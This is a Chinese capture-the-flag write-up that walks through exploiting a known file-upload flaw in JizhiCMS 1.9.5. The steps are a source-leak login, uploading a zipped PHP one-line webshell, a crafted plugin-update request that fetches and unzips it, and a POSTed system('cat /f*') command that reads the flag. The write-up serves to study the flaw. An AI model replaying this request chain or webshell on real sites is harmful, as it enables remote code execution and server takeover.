目录扫描后发现有www.zip

看源码

![](C:\Users\戴建\AppData\Roaming\marktext\images\2025-12-18-22-17-47-image.png)

发现在/admin.php有管理员登录，start.sh有账密

登录进去是一个cms管理员系统

在readme.txt中发现版本号极致CMS版本号是1.9.5

![](C:\Users\戴建\AppData\Roaming\marktext\images\2025-12-18-22-30-37-image.png)

在网上搜索极致cms1.9.5的CVE搜到jizhicms1.9.5的文件上传漏洞

文件上传漏洞点在后台的扩展管理 --> 插件列表中

![](C:\Users\戴建\AppData\Roaming\marktext\images\2025-12-18-22-33-21-image.png)

但是我们这里的插件列表和网上搜到的不一样

网上是这样的，点击下载抓包就行了，但是我们这里只有安装![](https://i-blog.csdnimg.cn/blog_migrate/a32cb94c911775bcef97ceefa22c8200.png)

在另一个博客下看到说

![](C:\Users\戴建\AppData\Roaming\marktext\images\2025-12-18-23-13-07-image.png)

看了wp说

`在 **扩展管理 » 插件列表** 中发现只有一个插件，这是由于容器不出网导致的，因此我们不能按照网上的方式，使用公网的 URL 链接下载文件，而是需要在将 .zip 文件上传到题目容器里，然后通过任意文件下载漏洞本地下载、解压`

然后就在栏目列表发现可以上传

![](C:\Users\戴建\AppData\Roaming\marktext\images\2025-12-18-22-38-18-image.png)

在上面这个页面上传一个原为php一句话木马的.zip包抓包

![](C:\Users\戴建\AppData\Roaming\marktext\images\2025-12-18-22-39-27-image.png)

画线的就是我们上传的1.zip包的位置，这里是`/static/upload/file/20251218/1766068746698032.zip`

这里可以通过访问看看有没有上传成功，访问后出现下载就说明成功了`http://202.119.201.199:31841/static/upload/file/20251218/1766068746698032.zip`

根据wp给的构造请求包

POST /admin.php/Plugins/update.html HTTP/1.1
Host: 202.119.201.199:31841
Content-Length: 126
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie:PHPSESSID=coirsick3i1bnutml2deq676v2

filepath=apidata&action=start-download&type=0&download_url=http%3a//127.0.0.1/static/upload/file/20251218/1766069902940055.zip

PHPSESSID要换成自己的，download_url后面的路径要改变

![](C:\Users\戴建\AppData\Roaming\marktext\images\2025-12-18-23-03-15-image.png)

出现上面这个响应就是成功了

然后将action改为file-upzip得到

![](C:\Users\戴建\AppData\Roaming\marktext\images\2025-12-18-23-06-36-image.png)

在A/c/PluginsController.php文件的update函数中能找到解压成功的文件在`/A/exts/`下

![](C:\Users\戴建\AppData\Roaming\marktext\images\2025-12-18-23-17-18-image.png)

解压成功后的文件在`/A/exts`我这里是`/A/exts/1.php`,打开后POST一个`a=system('cat /f*');`得到flag

![](C:\Users\戴建\AppData\Roaming\marktext\images\2025-12-18-23-08-43-image.png)
